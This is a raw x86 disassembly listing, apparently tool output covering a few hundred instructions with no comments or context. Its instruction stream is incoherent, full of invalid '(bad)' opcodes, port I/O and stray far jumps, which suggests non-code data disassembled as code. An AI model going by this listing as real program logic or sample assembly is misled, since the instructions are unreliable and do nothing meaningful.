  41d0ea:	sbb    ecx,DWORD PTR [esi-0x5f]
  41d0ed:	aas    
  41d0ee:	leave  
  41d0ef:	mov    gs,WORD PTR [ebx+ebp*8]
  41d0f2:	xchg   BYTE PTR [edx+0x2d02b87c],cl
  41d0f8:	loop   0x41d121
  41d0fa:	std    
  41d0fb:	mov    cl,0xf9
  41d0fd:	and    al,0x8c
  41d0ff:	add    esp,ecx
  41d101:	mov    ecx,0x3c7fcc24
  41d106:	ret    0x5646
  41d109:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d10a:	inc    ecx
  41d10b:	cdq    
  41d10c:	loope  0x41d161
  41d10e:	cmp    ebx,DWORD PTR [esi]
  41d110:	mov    dl,al
  41d112:	cld    
  41d113:	into   
  41d114:	adc    BYTE PTR [ecx],ah
  41d116:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d117:	out    dx,al
  41d118:	xchg   ebp,eax
  41d119:	xor    eax,0xec5c958
  41d11e:	loope  0x41d172
  41d120:	rcr    DWORD PTR [edx+0x7f],1
  41d123:	(bad)  [ebx]
  41d125:	cli    
  41d126:	mov    edx,0x7f3b30d2
  41d12b:	shl    ecx,0xba
  41d12e:	cmp    BYTE PTR [ebp-0x71],bh
  41d131:	stc    
  41d132:	ficom  WORD PTR [edx]
  41d134:	jl     0x41d16d
  41d136:	xlat   BYTE PTR ds:[ebx]
  41d137:	stos   BYTE PTR es:[edi],al
  41d138:	jmp    0x17380d5d
  41d13d:	jo     0x41d11b
  41d13f:	std    
  41d140:	sbb    al,ch
  41d142:	inc    ebp
  41d143:	adc    al,0x99
  41d145:	sub    eax,0xafdd48d3
  41d14a:	mov    dh,0xf1
  41d14c:	xor    bl,bl
  41d14e:	add    bh,BYTE PTR [edx+0xb]
  41d151:	push   ebp
  41d152:	cmp    al,0xbc
  41d154:	push   ds
  41d155:	stos   BYTE PTR es:[edi],al
  41d156:	xor    ebx,ebx
  41d158:	in     eax,dx
  41d159:	jg     0x41d141
  41d15b:	pop    ecx
  41d15c:	add    eax,0x18eb9a9a
  41d161:	xchg   ebp,eax
  41d162:	pop    edx
  41d163:	lods   eax,DWORD PTR ds:[esi]
  41d164:	pop    esi
  41d165:	pop    edx
  41d166:	and    eax,0x8914a593
  41d16b:	jno    0x41d130
  41d16d:	jo     0x41d1e4
  41d16f:	(bad)  
  41d172:	inc    ebx
  41d173:	pop    eax
  41d174:	mov    esi,0xcd17334a
  41d179:	adc    DWORD PTR [edx+eiz*1],esi
  41d17c:	pop    esi
  41d17d:	xchg   BYTE PTR [ecx+ecx*8],dl
  41d180:	mov    ecx,0x8a67889c
  41d185:	repz enter 0x753c,0x96
  41d18a:	and    al,0xc8
  41d18c:	scas   al,BYTE PTR es:[edi]
  41d18d:	dec    edx
  41d18e:	leave  
  41d18f:	or     eax,0xe9030c47
  41d194:	sbb    DWORD PTR ds:0xd22b97d6,edi
  41d19a:	mov    esp,0x24f43ed6
  41d19f:	test   eax,0x7ccbd24c
  41d1a4:	(bad)  
  41d1a5:	cld    
  41d1a6:	repnz pop edx
  41d1a8:	sub    bh,al
  41d1aa:	jno    0x41d1cd
  41d1ac:	div    dl
  41d1ae:	aad    0x8c
  41d1b0:	adc    al,0x2e
  41d1b2:	mov    al,0x70
  41d1b4:	test   DWORD PTR [esp+eiz*2],esi
  41d1b7:	sub    ah,BYTE PTR [eax+eax*1-0x22]
  41d1bb:	fsubr  DWORD PTR [ecx-0x2c90eafd]
  41d1c1:	jne    0x41d165
  41d1c3:	fbstp  TBYTE PTR [eax-0xe]
  41d1c6:	xchg   ebx,eax
  41d1c7:	inc    ecx
  41d1c8:	mov    edx,0xe9dec6ea
  41d1cd:	lods   al,BYTE PTR ds:[esi]
  41d1ce:	leave  
  41d1cf:	pop    esp
  41d1d0:	sub    ecx,ebx
  41d1d2:	sub    BYTE PTR [ecx-0x4a],dh
  41d1d5:	cdq    
  41d1d6:	push   cs
  41d1d7:	dec    ecx
  41d1d8:	ffree  st(5)
  41d1da:	pop    es
  41d1db:	push   edx
  41d1dc:	pushf  
  41d1dd:	lods   eax,DWORD PTR ds:[esi]
  41d1de:	aas    
  41d1df:	mov    esi,DWORD PTR [ecx+0x2b097e42]
  41d1e5:	sub    cl,BYTE PTR [edx+edi*8+0x11]
  41d1e9:	pushf  
  41d1ea:	mov    ch,0xad
  41d1ec:	mov    al,0xdd
  41d1ee:	sub    al,0xfb
  41d1f0:	dec    eax
  41d1f1:	mov    ch,0xb6
  41d1f3:	test   ah,ah
  41d1f5:	cdq    
  41d1f6:	data16 adc al,al
  41d1f9:	xor    BYTE PTR [ecx-0x2a],dh
  41d1fc:	lock xlat BYTE PTR ds:[ebx]
  41d1fe:	or     ebp,edx
  41d200:	ret    
  41d201:	mov    ah,BYTE PTR ss:[edi-0x3ab9cd0f]
  41d208:	add    DWORD PTR [edx-0x2da15a9c],esi
  41d20e:	add    ebp,edi
  41d210:	aaa    
  41d211:	das    
  41d212:	pop    eax
  41d213:	adc    dh,cl
  41d215:	div    DWORD PTR [edx-0x2]
  41d218:	pop    esp
  41d219:	push   edi
  41d21a:	jbe    0x41d234
  41d21c:	push   esp
  41d21d:	inc    ebx
  41d21e:	xor    bh,BYTE PTR [eax-0x38]
  41d221:	and    eax,0x150808f5
  41d226:	aam    0x46
  41d228:	jmp    0xbc57b335
  41d22d:	mov    ds:0x1b9d2c82,eax
  41d232:	js     0x41d25c
  41d234:	pop    edx
  41d235:	sub    BYTE PTR [ebp-0x7b40c548],ah
  41d23b:	dec    ebp
  41d23c:	push   gs
  41d23e:	mov    es,WORD PTR [edi-0x39bfa2d3]
  41d244:	out    dx,al
  41d245:	xchg   DWORD PTR [si+0x67f2],edx
  41d24a:	xor    al,0x55
  41d24c:	out    0x55,al
  41d24e:	mov    al,ds:0xc76d79f
  41d253:	je     0x41d24a
  41d255:	push   ebp
  41d256:	mov    ebx,0x91030941
  41d25b:	imul   esp,DWORD PTR [edi+edi*2],0x32
  41d25f:	cld    
  41d260:	push   0x13cd159b
  41d265:	shr    BYTE PTR [edx-0x7427236d],1
  41d26b:	(bad)  
  41d26c:	(bad)  [esp+edi*1-0x533e7a76]
  41d273:	shl    DWORD PTR [ebp+0x69],cl
  41d276:	test   DWORD PTR [ebx+0x1541860f],esp
  41d27c:	mov    bh,0xf3
  41d27e:	(bad)  
  41d27f:	sar    esi,1
  41d281:	sub    eax,0x459c61dd
  41d286:	fsubr  DWORD PTR [eax+0x1c]
  41d289:	imul   ebp,DWORD PTR [edx+0x409ae219],0x6b
  41d290:	shr    BYTE PTR [ebx],0x76
  41d293:	lea    esp,[esi-0x3bad929]
  41d299:	mov    cl,0xac
  41d29b:	sub    DWORD PTR [ebp+0x4524c306],0xfffffffd
  41d2a2:	mov    edi,0x9902e3e2
  41d2a7:	std    
  41d2a8:	fisttp WORD PTR [edi+0x1e8310f6]
  41d2ae:	add    BYTE PTR [edx-0x51],al
  41d2b1:	icebp  
  41d2b2:	retf   0xe300
  41d2b5:	aaa    
  41d2b6:	mov    dh,0x78
  41d2b8:	outs   dx,BYTE PTR ds:[esi]
  41d2b9:	jns    0x41d2c9
  41d2bb:	sbb    ah,BYTE PTR [esi]
  41d2bd:	or     BYTE PTR [eax],0x8
  41d2c0:	in     eax,0x14
  41d2c2:	jb     0x41d2e0
  41d2c4:	xchg   edx,eax
  41d2c5:	xchg   ebx,eax
  41d2c6:	popa   
  41d2c7:	js     0x41d2ab
  41d2c9:	mov    DWORD PTR [edi],esi
  41d2cb:	pusha  
  41d2cc:	dec    ebx
  41d2cd:	sub    ah,bl
  41d2cf:	imul   eax,DWORD PTR [edi+ebx*4],0xffffffa2
  41d2d3:	stc    
  41d2d4:	push   0x76f24f85
  41d2d9:	daa    
  41d2da:	fs adc al,0xa9
  41d2dd:	and    al,0x10
  41d2df:	frstor [esi]
  41d2e1:	outs   dx,BYTE PTR ds:[esi]
  41d2e2:	aad    0x45
  41d2e4:	icebp  
  41d2e5:	or     ecx,DWORD PTR [ecx]
  41d2e7:	xor    eax,0x5a5a083
  41d2ec:	jmp    0x1fe7:0xde48a415
  41d2f3:	xchg   esp,eax
  41d2f4:	js     0x41d2cb
  41d2f6:	bnd jmp 0xb08e0e78
  41d2fc:	daa    
  41d2fd:	inc    BYTE PTR [ecx+0x70]
  41d300:	rol    ebx,1
  41d302:	lock aad 0x93
  41d305:	push   ss
  41d306:	outs   dx,DWORD PTR ds:[esi]
  41d307:	fadd   DWORD PTR [edx]
  41d309:	hlt    
  41d30a:	sub    esp,DWORD PTR [edx]
  41d30c:	mov    dh,0xcd
  41d30e:	push   edi
  41d30f:	pop    edx
  41d310:	adc    BYTE PTR [ebx-0x4e],cl
  41d313:	repnz in al,0xa6
  41d316:	fldcw  WORD PTR [edi+0x2c]
  41d319:	repz jne 0x41d375
  41d31c:	sbb    eax,0xdf303f22
  41d321:	dec    edi
  41d322:	xchg   BYTE PTR [edx+ebp*1+0x5d],bh
  41d326:	ret    
  41d327:	jne    0x41d346
  41d329:	outs   dx,BYTE PTR ds:[esi]
  41d32a:	cmp    DWORD PTR [edi],esp
  41d32c:	in     al,dx
  41d32d:	(bad)
  41d330:	lods   al,BYTE PTR ds:[esi]
  41d331:	rcl    DWORD PTR [eax],0xcf
  41d334:	pop    edi
  41d335:	cmp    eax,0x9f89b196
  41d33a:	in     al,dx
  41d33b:	jnp    0x41d2c7
  41d33d:	push   ss
  41d33e:	(bad)  
  41d33f:	(bad)  
  41d340:	cmp    ecx,esp
  41d342:	cli    
  41d343:	pushf  
  41d344:	pop    edx
  41d345:	push   esp
  41d346:	inc    esp
  41d347:	dec    ebx
  41d348:	and    BYTE PTR [eax-0x22],cl
  41d34b:	add    edi,edi
  41d34d:	repz mov edx,0xcd78ceb
  41d353:	xchg   DWORD PTR [edx-0x44a907fe],esi
  41d359:	xchg   esp,eax
  41d35a:	rcr    BYTE PTR [eax+ebx*1+0x44],cl
  41d35e:	test   BYTE PTR [eax+0x6521f347],cl
  41d364:	call   0x4b11:0xa93a9fe2
  41d36b:	or     ah,BYTE PTR [edi]
  41d36d:	lods   eax,DWORD PTR ds:[esi]
  41d36e:	or     DWORD PTR [edi-0x17],esp
  41d371:	sbb    eax,0x37050dda
  41d376:	jmp    0xdb6a8ffa
  41d37b:	fidiv  WORD PTR [ebx-0x1f]
  41d37e:	and    al,0x66
  41d380:	or     DWORD PTR [eax+0x4ab0edae],edx
  41d386:	je     0x41d35d
  41d388:	jl     0x41d3d6
  41d38a:	inc    ebx
  41d38b:	loop   0x41d395
  41d38d:	call   FWORD PTR [ecx-0x53fdf50f]
  41d393:	sbb    eax,0x564406e
  41d398:	and    BYTE PTR [edx+0x5053c842],al
  41d39e:	adc    ebp,ebx
  41d3a0:	mov    ch,0xa3
  41d3a2:	(bad)  
  41d3a3:	xchg   esi,eax
  41d3a4:	mov    cl,0xda
  41d3a6:	sub    ebx,DWORD PTR [edx-0x384fd494]
  41d3ac:	mov    dl,0x86
  41d3ae:	jo     0x41d3c6
  41d3b0:	ins    DWORD PTR es:[edi],dx
  41d3b1:	out    dx,eax
  41d3b2:	mov    ebx,0xde8899cd
  41d3b7:	fs xchg ebx,eax
  41d3b9:	arpl   WORD PTR [esi+eax*8],bp
  41d3bc:	test   BYTE PTR [ecx],ah
  41d3be:	neg    BYTE PTR [esi-0x41]
  41d3c1:	jecxz  0x41d42d
  41d3c3:	test   al,0xc3
  41d3c5:	inc    edx
  41d3c6:	mov    eax,ds:0x78a08220
  41d3cb:	cmp    ah,dh
  41d3cd:	ja     0x41d3a6
  41d3cf:	inc    eax
  41d3d0:	or     esi,esp
  41d3d2:	test   DWORD PTR [eax],esi
  41d3d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3d5:	inc    edi
  41d3d6:	adc    DWORD PTR [esi+edx*4],esp
  41d3d9:	mov    ecx,0xe1b0d404
  41d3de:	lahf   
  41d3df:	popf   
  41d3e0:	cld    
  41d3e1:	jl     0x41d3de
  41d3e3:	sub    eax,0x5c16c013
  41d3e8:	jne    0x41d40c
  41d3ea:	cmp    DWORD PTR [ecx*1-0x30835e5b],esp
  41d3f1:	outs   dx,DWORD PTR ds:[esi]
  41d3f2:	mov    dh,0xad
  41d3f4:	fcomp  QWORD PTR [esi+0x70]
  41d3f7:	(bad)  
  41d3f8:	icebp  
  41d3f9:	loopne 0x41d398
  41d3fb:	jno    0x41d42b
  41d3fd:	jmp    0xd9fc:0x5afce41e
  41d404:	mov    ebx,0xaa4eeef2
  41d409:	imul   sp,WORD PTR [esi+0x61],0x6091
  41d40f:	aam    0x19
  41d411:	jno    0x41d44e
  41d413:	jmp    0x8537:0x63a76dac
  41d41a:	and    eax,0x4aa4733c
  41d41f:	outs   dx,DWORD PTR ds:[esi]
  41d420:	dec    ebx
  41d421:	xchg   esi,eax
  41d422:	lods   eax,DWORD PTR ds:[esi]
  41d423:	jns    0x41d42d
  41d425:	dec    ebx
  41d426:	je     0x41d461
  41d428:	in     eax,0x20
  41d42a:	stc    
  41d42b:	ss jp  0x41d3b7
  41d42e:	ins    DWORD PTR es:[edi],dx
  41d42f:	mov    ds:0xe8a5247b,eax
  41d434:	adc    DWORD PTR [edx],eax
  41d436:	dec    ebx
  41d437:	fist   DWORD PTR [eax]
  41d439:	sub    eax,0x2fa078a1
  41d43e:	aas    
  41d43f:	add    BYTE PTR [edx+esi*4+0x78],ah
  41d443:	rol    DWORD PTR [ebx-0x6b7c07c5],cl
  41d449:	loop   0x41d4ba
  41d44b:	pop    ebp
  41d44c:	lds    edi,FWORD PTR [ecx-0x24]
  41d44f:	xchg   ebx,eax
  41d450:	adc    al,0x23
  41d452:	mov    ah,0x68
  41d454:	outs   dx,BYTE PTR ds:[esi]
  41d455:	shl    DWORD PTR [edx-0x78],0x1
  41d459:	adc    edi,DWORD PTR [edx+0x40]
  41d45c:	xor    DWORD PTR [esi],edi
  41d45e:	sti    
  41d45f:	push   ebp
  41d460:	ds pop esi
  41d462:	xor    ah,dh
  41d464:	cwde   
  41d465:	shl    DWORD PTR [eax+0x7d],1
  41d468:	cwde   
  41d469:	adc    ebp,DWORD PTR [edi-0xf40672a]
  41d46f:	cmp    eax,0x873bff87
  41d474:	dec    eax
  41d475:	cmp    DWORD PTR [eax+0x4e17ff78],edi
  41d47b:	enter  0x5e6c,0x60
  41d47f:	inc    eax
  41d480:	gs ds cs pop ecx
  41d484:	pop    esp
  41d485:	(bad)  
  41d486:	mov    cl,0xfc
  41d488:	loopne 0x41d4cd
  41d48a:	mov    bl,0x41
  41d48c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d48d:	sar    BYTE PTR [edi-0x7597366b],cl
  41d493:	sbb    eax,0xb07ae083
  41d498:	cmp    DWORD PTR [eax-0x80],esp
  41d49b:	push   ecx
  41d49c:	pop    es
  41d49d:	icebp  
  41d49e:	scas   eax,DWORD PTR es:[edi]
  41d49f:	push   es
  41d4a0:	adc    ebp,DWORD PTR [ecx+0x78]
  41d4a3:	cmp    dh,ah
  41d4a5:	fdivr  st(0),st
  41d4a7:	or     DWORD PTR [esi+esi*4+0x5f],ecx
  41d4ab:	dec    eax
  41d4ac:	outs   dx,BYTE PTR ds:[esi]
  41d4ad:	xchg   esp,eax
  41d4ae:	mov    bh,ah
  41d4b0:	sti    
  41d4b1:	pop    es
  41d4b2:	mov    ch,0x3b
  41d4b4:	dec    eax
  41d4b5:	stos   BYTE PTR es:[edi],al
  41d4b6:	pop    ds
  41d4b7:	popf   
  41d4b8:	xchg   esi,eax
  41d4b9:	retf   
  41d4ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4bb:	push   edi
  41d4bc:	ret    
  41d4bd:	lock push eax
  41d4bf:	out    dx,eax
  41d4c0:	xchg   ebp,eax
  41d4c1:	iret   
  41d4c2:	sbb    al,0x93
  41d4c4:	dec    ebp
  41d4c5:	mov    esp,0x565302b9
  41d4ca:	add    al,BYTE PTR [eax]
  41d4cc:	pop    edi
  41d4cd:	push   ebx
  41d4ce:	adc    al,0x4f
  41d4d0:	nop
  41d4d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4d2:	sbb    al,BYTE PTR [ecx-0x77f63edc]
  41d4d8:	(bad)  
  41d4d9:	mov    esp,0xa40a3767
  41d4de:	adc    ebx,eax
  41d4e0:	mov    ecx,0xf743da7b
  41d4e5:	sub    al,0x86
  41d4e7:	adc    dl,bh
  41d4e9:	arpl   WORD PTR [ecx-0x20a9ad5d],cx
  41d4ef:	adc    eax,0xd45edd1d
  41d4f4:	inc    eax
  41d4f5:	push   esi
  41d4f6:	jle    0x41d4e6
  41d4f8:	in     eax,dx
  41d4f9:	mov    ds:0x4060b35e,eax
  41d4fe:	aam    0xa1
  41d500:	jmp    0x5f3b:0xf00813d8
  41d507:	mov    esp,0xb63fbdb2
  41d50c:	into   
  41d50d:	test   eax,0x94d90ef8
  41d512:	pop    ebp
  41d513:	mov    edx,0x19967479
  41d518:	pop    ds
  41d519:	adc    ecx,edx
  41d51b:	out    0xc7,eax
  41d51d:	pop    esi
  41d51e:	fst    DWORD PTR [edx+0x5dc35ea5]
  41d524:	push   es
  41d525:	dec    ebx
  41d526:	das    
  41d527:	jmp    0x41d59d
  41d529:	pop    ebp
  41d52a:	mov    eax,0xfd72c85f
  41d52f:	xor    edx,DWORD PTR [ebx]
  41d531:	sub    ecx,DWORD PTR [esi-0x20]
  41d534:	js     0x41d4cd
  41d536:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41d538:	mov    ecx,esi
  41d53a:	cmp    DWORD PTR [ecx],edi
  41d53c:	popa   
  41d53d:	jg     0x41d4e8
  41d53f:	push   0x68
  41d541:	fld    QWORD PTR [ecx-0x2f6cd0e1]
  41d547:	(bad)  
  41d549:	bnd jb 0x41d50a
  41d54c:	add    esp,edx
  41d54e:	xor    esp,DWORD PTR [edi+0x13]
  41d551:	push   0xffffffcc
  41d553:	gs cmp ch,bl
  41d556:	and    ecx,DWORD PTR [edi]
  41d558:	arpl   WORD PTR [ebx+ebp*4-0x5879329c],bx
  41d55f:	sub    DWORD PTR [ecx+0x30e8f8db],0xb55b0afc
  41d569:	int    0xc7
  41d56b:	imul   edi,DWORD PTR [eax+edi*8-0x2a8c42a4],0xfffffffd
  41d573:	pop    es
  41d574:	pop    ds
  41d575:	jg     0x41d573
  41d577:	pop    eax
  41d578:	retf   
  41d579:	ficom  DWORD PTR [esp+edx*2]
  41d57c:	rol    DWORD PTR [edi+0x32],0x28
  41d580:	xor    edi,edi
  41d582:	mov    gs,WORD PTR [ebx+ecx*1]
  41d585:	push   ebp
  41d586:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d587:	(bad)  
  41d588:	nop
  41d589:	imul   ebx,ebx,0xffffffc0
  41d58c:	and    DWORD PTR [ebx+0x1b2fc37b],edx
  41d592:	test   eax,0xd7d1c666
  41d597:	loopne 0x41d5b3
  41d599:	out    dx,eax
  41d59a:	mov    ?,WORD PTR [eax-0x1]
  41d59d:	(bad)  
  41d59e:	jmp    0x41d57f
  41d5a0:	repnz and edx,DWORD PTR [ebx+0x35d24297]
  41d5a7:	and    BYTE PTR [esi-0x6a257ca4],ch
  41d5ad:	rcl    DWORD PTR [eax+eiz*2-0x7351c27e],1
  41d5b4:	jo     0x41d614
  41d5b6:	int3   
  41d5b7:	push   es
  41d5b8:	enter  0xdd34,0x70
  41d5bc:	mov    eax,ds:0x89296754
  41d5c1:	mov    ebp,?
  41d5c3:	adc    al,bh
  41d5c5:	ret    
  41d5c6:	sbb    al,0x30
  41d5c8:	std    
  41d5c9:	jno    0x41d5f4
  41d5cb:	pop    ebx
  41d5cc:	sbb    eax,0xd3b01908
  41d5d1:	push   esi
  41d5d2:	mov    ds:0x464fb738,eax
  41d5d7:	ja     0x71ea42cf
  41d5dd:	cmp    eax,0xf7e21ba3
  41d5e2:	lahf   
  41d5e3:	push   ds
  41d5e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5e5:	inc    edx
  41d5e6:	sbb    edi,DWORD PTR [eax]
  41d5e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5e9:	fwait
  41d5ea:	hlt    
  41d5eb:	push   0x64
  41d5ed:	dec    ecx
  41d5ee:	loope  0x41d617
  41d5f0:	xor    al,0xc1
  41d5f2:	sbb    BYTE PTR [eax+0xd],al
  41d5f5:	hlt    
  41d5f6:	outs   dx,BYTE PTR ds:[esi]
  41d5f7:	(bad)  
  41d5f8:	outs   dx,BYTE PTR ds:[esi]
  41d5f9:	inc    ecx
  41d5fa:	inc    esi
  41d5fb:	test   al,0xc0
  41d5fd:	pop    ds
  41d5fe:	jg     0x41d58f
  41d600:	or     al,0x1d
  41d602:	lahf   
  41d603:	add    eax,0x21246a0b
  41d608:	adc    eax,0xf7a6b30f
  41d60d:	sbb    ebp,DWORD PTR [edx]
  41d60f:	add    esi,0xe6792779
  41d615:	(bad)  [eax+0x47]
  41d618:	mul    ebp
  41d61a:	loope  0x41d5bd
  41d61c:	add    eax,0x7f209a72
  41d621:	jo     0x41d671
  41d623:	jg     0x41d6a3
  41d625:	(bad)  
  41d626:	jle    0x41d5ce
  41d628:	xor    al,0x20
  41d62a:	ret    0x7036
  41d62d:	pop    esi
  41d62e:	sub    DWORD PTR [edx-0x1b970149],esi
  41d634:	cmc    
  41d635:	and    al,0x59
  41d637:	jnp    0x41d628
  41d639:	mov    bh,0x27
  41d63b:	js     0x41d5bf
  41d63d:	xchg   esp,eax
  41d63e:	adc    eax,0xfdc78774
  41d643:	sub    dh,bl
  41d645:	not    DWORD PTR [edx]
  41d647:	push   ss
  41d648:	add    eax,0x39c18178
  41d64d:	sub    eax,0x88a33a4
  41d652:	xchg   esp,eax
  41d653:	pushf  
  41d654:	jg     0x41d6cd
  41d656:	or     al,0xba
  41d658:	inc    edi
  41d659:	push   ebx
  41d65a:	into   
  41d65b:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41d65d:	call   DWORD PTR [edi]
  41d65f:	sub    DWORD PTR [edi+0x41139d9c],ecx
  41d665:	sahf   
  41d666:	hlt    
  41d667:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d668:	daa    
  41d669:	inc    esp
  41d66a:	(bad)  
  41d66b:	sub    bl,bh
  41d66d:	(bad)  
  41d66e:	push   esi
  41d66f:	fld    QWORD PTR [ebx+0x39]
  41d672:	mov    edx,0x95d4619
  41d677:	jb     0x41d6ab
  41d679:	not    BYTE PTR [ecx+0x38]
  41d67c:	gs aaa 
  41d67e:	(bad)  
  41d67f:	push   ecx
  41d680:	xor    al,ah
  41d682:	call   0xa33c:0xe5c66d2a
  41d689:	sub    bl,BYTE PTR [esi+0x3b]
  41d68c:	inc    ebx
  41d68d:	(bad)  
  41d68e:	(bad)  
  41d68f:	mul    BYTE PTR [ebx-0x49]
  41d692:	add    eax,DWORD PTR [bp+si+0x3d9b]
  41d697:	push   ss
  41d698:	sub    esp,DWORD PTR [eax]
  41d69a:	dec    esi
  41d69b:	daa    
  41d69c:	outs   dx,DWORD PTR ds:[esi]
  41d69d:	in     eax,0x9
  41d69f:	out    dx,al
  41d6a0:	sub    DWORD PTR [ebx-0x2da0caa7],esp
  41d6a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6a7:	or     edx,esp
  41d6a9:	adc    BYTE PTR [ebp+0x2d47aaaf],cl
  41d6af:	out    dx,eax
  41d6b0:	pxor   mm3,QWORD PTR [edi-0x4d1cbb8]
  41d6b7:	fst    DWORD PTR [ecx]
  41d6b9:	adc    BYTE PTR [esi-0x70a7c9a7],bh
  41d6bf:	cmp    edi,edx
  41d6c1:	mov    BYTE PTR [esp+eiz*8-0x3d17a0f7],dl
  41d6c8:	aam    0x75
  41d6ca:	mov    ds:0xe5b5e1f4,al
  41d6cf:	out    dx,eax
  41d6d0:	jbe    0x41d6bc
  41d6d2:	sbb    al,ah
  41d6d4:	data16 add al,0x4a
  41d6d7:	(bad)  
  41d6d8:	xlat   BYTE PTR ds:[ebx]
  41d6d9:	adc    ecx,DWORD PTR [ecx]
  41d6db:	pop    ss
  41d6dc:	jle    0x41d6cf
  41d6de:	xchg   ebx,eax
  41d6df:	and    bl,BYTE PTR [eax-0x2baed858]
  41d6e5:	add    ebx,esp
  41d6e7:	push   cs
  41d6e8:	(bad)  
  41d6e9:	mov    esp,0x7aa5b3ab
  41d6ee:	push   cs
  41d6ef:	adc    DWORD PTR [eax+eiz*8-0x50],esp
  41d6f3:	mov    ebp,cs
  41d6f5:	bound  ecx,QWORD PTR [edi]
  41d6f7:	push   eax
  41d6f8:	cld    
  41d6f9:	pop    ds
  41d6fa:	and    eax,ebp
  41d6fc:	aaa    
  41d6fd:	push   edx
  41d6fe:	ret    
  41d6ff:	hlt    
  41d700:	pushf  
  41d701:	inc    eax
  41d702:	mov    DWORD PTR [ebp+0x26aac614],edx
  41d708:	imul   ebx,DWORD PTR [eax+0x965490d],0xffffffd0
  41d70f:	and    al,0x10
  41d711:	hlt    
  41d712:	adc    cl,BYTE PTR [esi]
  41d714:	daa    
  41d715:	mov    ch,0x45
  41d717:	int    0x1a
  41d719:	or     DWORD PTR [edi+0x7a],ecx
  41d71c:	scas   al,BYTE PTR es:[edi]
  41d71d:	test   BYTE PTR [esp+esi*4-0x5],cl
  41d721:	mov    eax,ds:0x81edec82
  41d726:	inc    edx
  41d727:	ret    
  41d728:	push   0xffffff86
  41d72a:	hlt    
  41d72b:	xor    bl,0x14
  41d72e:	cwde   
  41d72f:	sub    eax,0x4454edaa
  41d734:	icebp  
  41d735:	jle    0x41d79e
  41d737:	cmp    al,0x6e
  41d739:	int3   
  41d73a:	dec    esi
  41d73b:	ins    DWORD PTR es:[edi],dx
  41d73c:	imul   esp,DWORD PTR [ebx+0x24],0x5820948c
  41d743:	cmp    edx,DWORD PTR [eax+0xc985e88]
  41d749:	push   ebx
  41d74a:	or     edx,0xe9ffa73f
  41d750:	nop
  41d751:	and    eax,0xb284e2f0
  41d756:	out    dx,al
  41d757:	inc    edx
  41d758:	mov    edx,0x846122b2
  41d75d:	cdq    
  41d75e:	mov    dl,0x7c
  41d760:	(bad)  
  41d761:	jb     0x41d76f
  41d763:	dec    ebp
  41d764:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d765:	das    
  41d766:	outs   dx,BYTE PTR ds:[esi]
  41d767:	jnp    0x41d7a7
  41d769:	or     bl,bh
  41d76b:	cs fldln2 
  41d76e:	xor    edx,DWORD PTR [edi+0x3f]
  41d771:	es std 
  41d773:	jo     0x41d7cd
  41d775:	call   0xd8e9:0xec1f447
  41d77c:	xor    eax,DWORD PTR [ebp-0x7e]
  41d77f:	fisttp QWORD PTR [ecx]
  41d781:	inc    ebx
  41d782:	fbstp  TBYTE PTR [ebp+0x441d9b95]
  41d788:	cld    
  41d789:	cmp    BYTE PTR [eax-0x6],cl
  41d78c:	or     DWORD PTR [ebp+0x57],edi
  41d78f:	sub    ah,al
  41d791:	sbb    al,0x2d
  41d793:	sbb    eax,DWORD PTR [esi-0x25fc7e9a]
  41d799:	dec    ebp
  41d79a:	and    eax,0xcecc6b10
  41d79f:	inc    ebp
  41d7a0:	sub    DWORD PTR [ebp-0x3e],0xffffffad
  41d7a4:	push   ds
  41d7a5:	jp     0x41d825
  41d7a7:	cmp    eax,0x8d3e446f
  41d7ac:	hlt    
  41d7ad:	or     BYTE PTR [ebp-0x5],0xb3
  41d7b1:	inc    edi
  41d7b2:	jo     0x41d79e
  41d7b4:	in     al,dx
  41d7b5:	dec    edi
  41d7b6:	data16 add al,0xce
  41d7b9:	mov    dl,0xd3
  41d7bb:	ret    0xe31
  41d7be:	jno    0x41d83b
  41d7c0:	ror    DWORD PTR [edi+0x57],1
  41d7c3:	fistp  WORD PTR [eax]
  41d7c5:	repz lahf 
  41d7c7:	lds    esi,FWORD PTR [ebx+0xe]
  41d7ca:	arpl   WORD PTR [ebp-0x8a48f6e],ax
  41d7d0:	xchg   edx,eax
  41d7d1:	jecxz  0x41d824
  41d7d3:	mov    esi,0x64ee9d62
  41d7d8:	push   ebp
  41d7d9:	loopne 0x41d76b
  41d7db:	dec    esi
  41d7dc:	jnp    0x41d827
  41d7de:	not    BYTE PTR [edx+0x79]
  41d7e1:	ja     0x41d7a8
  41d7e3:	cwde   
  41d7e4:	adc    al,0xa4
  41d7e6:	and    BYTE PTR [ebx-0x637159c8],cl
  41d7ec:	jmp    0x41d77b
  41d7ee:	xor    BYTE PTR [ecx],cl
  41d7f0:	xchg   edx,eax
  41d7f1:	push   ss
  41d7f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7f3:	out    0x8c,eax
  41d7f5:	lock push ecx
  41d7f7:	loopne 0x41d81b
  41d7f9:	mov    bh,0x70
  41d7fb:	stc    
  41d7fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7fd:	aam    0xcf
  41d7ff:	fwait
  41d800:	ret    0x5165
  41d803:	out    dx,eax
  41d804:	aaa    
  41d805:	call   FWORD PTR [ecx]
  41d807:	mov    ecx,0x8c95f2bf
  41d80c:	popf   
  41d80d:	loope  0x41d835
  41d80f:	dec    edi
  41d810:	pop    es
  41d811:	enter  0x9f8e,0xfb
  41d815:	cmp    ebx,esp
  41d817:	jne    0x41d82c
  41d819:	cld    
  41d81a:	mov    ecx,0x7bca209
  41d81f:	dec    esi
  41d820:	comiss xmm3,DWORD PTR [ebx+eax*2-0x52]
  41d825:	jp     0x41d864
  41d827:	add    al,0x10
  41d829:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
